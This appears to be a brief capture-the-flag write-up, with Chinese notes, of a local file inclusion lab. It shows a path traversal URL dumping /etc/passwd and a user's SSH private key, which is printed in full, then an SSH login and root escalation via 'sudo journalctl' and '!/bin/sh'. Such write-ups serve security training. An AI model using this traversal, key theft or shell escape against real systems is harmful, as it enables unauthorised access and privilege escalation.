




http://10.10.210.139/home?page=../../../../../etc/passwd
```
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false 
falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash 
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
```

系統上的用戶名是什麼？
falcon

得到falcon的ssh金鑰 格式要注意 然後chmod 600
```
http://10.10.210.139/home?page=../../../../../home/falcon/.ssh/id_rsa.pub

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAy5ab5+v0aBYFL7dN4O69CqvZdjpSk4/BFMOEndp71fy4qlBi
ewnTYIyKS1DjNhLdbLJZV/8oKOIx/BVSxrw3hnjL/b5d3jUpX1edcX8hjTt10LCT
ubgjWekIpspImHtp/vf9n0IlL1GIWLsxKZXEqyoSvvG4LU6ajrMyHM9jyZ7yMAsS
lHtfNzX22taxJliHF3SFDjf6Z0otY98T273qy6uTchBDEIZx7uJGQF4h9bvSq+22
e7QFY/h/cLrVUPGcRgv2VH4958A5n+BA48ioVyjGRcJlPsa8fNuFkgA8VlJqx/zD
Erf3G97zCY5iZSSm6g+9aUBAoqJqQqnZ1JY/jQIDAQABAoIBAQCjN3qEY7GM5OKB
j6Z7B0s9S+rKkxVywdQczmb6mpefRb3SpSFe3NC+3c1ddlrCFju4kf94wdIzfKxw
GbREKc8mGqAILN9abypdCoPp4u9GJ/5bMcUtJogI4/+QoCm1PXQL+ks1q7TeC7KQ
2HogibajNtbSiD2M7TCR6O3rFQU+NKW3P8R5rTJBFxSqXcoL0aZoOdIISuGo4e2D
w5p8eLHiYmKmQ3KYW58fau1Qnr8t0YoHDlG2wezNBQSckt5xxjY4XWlfcMPAQIP9
VWxv77zIqfLFYj6oH0opPHX7SbdpFVj00h7Ee2C0QR7CKj4lxmE2Dn97LEXksfWM
PqmJwiRBAoGBAPRGPZtAT7TfTac7lXbOYNj/5HuK1Pc7+GtsT8V3AJwbhkeZG/B+
ERee3gKlXhglEup0duxBwy5zTy6vsegMo7sk2ii/GlboR44Yy7OYbjrmIw7JRx6i
IIjN6YeKM+dwLGL7+xG2EavrRBJbuYfp1R139gK5CWd6Yu6xdwtCPS8xAoGBANVc
ZhSQOWzkN0Yq4CsAnKrrtIeynX7wTppy2F3N8/CQHQIYjFx0SZxs/1MlTXEpFdC+
VHhQ+Cy5O+hndqXiG5sty9wC67lZNaxuBkMoxKgX42JAgxxE41lUadAdRHJ4cq7A
1DiJ1xq3XwP1ZaUEVE/Y3EusMhtr/A6z1dGJcpcdAoGAdb6d14XqZb71iVS5OOlF
2ZOPKNXEzd+EYRN2aDJygszprv1ocEX0KzSSwye+8Vh9g7Hb2Qnh8TP3yQM7eCUP
jxe2aMmlAps4UpA1MD6bc5yW7Xur4mI32HmYxZKibj6txpC7dtASOJJQ36CDD7Zw
2aGHXcyfcdeWdIPqY+zr3SECgYEAoi4SCh93ByaSPWvp6cYVUHbKSzuiLBNOLGiP
vv4GJx3kbutqBfz+10Ci8/iu3Q11365NVwd1HcnPl+DNd1pf0Z0GEL7Hn6QIAIHB
kNs0YPGHje+ruZlDl2tq4x7cIIcd5Wf96Nwd/djVCJVIJh8cV3VoPr0teVqjxik8
poHr8KECgYBGJ/FLmaloEl00YECXAy2uMlvGyaAr2tsq28JF3LvZOXNIhB71+11V
E/gv9PP0ruJJRBv5r2DjAcsWA+sIBf5O8+z5dTeuto5v+WTrpOy8i3FLEWl3hqRH
ANCTI4EhCynYtF8zi8so5zeomlncFZg7JD/dL0gHXu4FImx5sUO9gg==
-----END RSA PRIVATE KEY-----
```
ssh
```
┌──(kali㉿kali)-[~/thm/lfi]
└─$ ssh -i id_rsa falcon@10.10.210.139
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jan 30 19:50:16 IST 2022

  System load:  0.0               Processes:           86
  Usage of /:   30.6% of 9.78GB   Users logged in:     0
  Memory usage: 16%               IP address for eth0: 10.10.210.139
  Swap usage:   0%


6 packages can be updated.
3 updates are security updates.


Last login: Sun Jan 30 19:49:22 2022 from 10.9.2.107
falcon@walk:~$ 

```
sudo -l
```
falcon@walk:~$ sudo -l
Matching Defaults entries for falcon on walk:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falcon may run the following commands on walk:
    (root) NOPASSWD: /bin/journalctl

```
gtfo
```
sudo journalctl
!/bin/sh
```